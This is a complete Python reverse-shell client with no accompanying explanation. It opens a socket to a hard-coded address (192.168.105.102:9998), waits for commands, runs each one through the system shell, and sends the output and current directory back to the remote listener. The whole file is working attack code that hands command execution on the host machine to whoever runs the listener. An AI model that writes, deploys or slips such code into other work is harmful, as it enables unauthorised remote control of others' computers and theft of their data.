import os
import socket
import subprocess

s = socket.socket()
host = '192.168.105.102'
port = 9998
s.connect((host,port))

while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))

	if len(data) > 0:
		command = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		output_bytes = command.stdout.read() + command.stderr.read()
		output_string = str(output_bytes,"utf-8")
		s.send(str.encode(output_string + str(os.getcwd()) + '>' ))
		print(output_string)

s.close()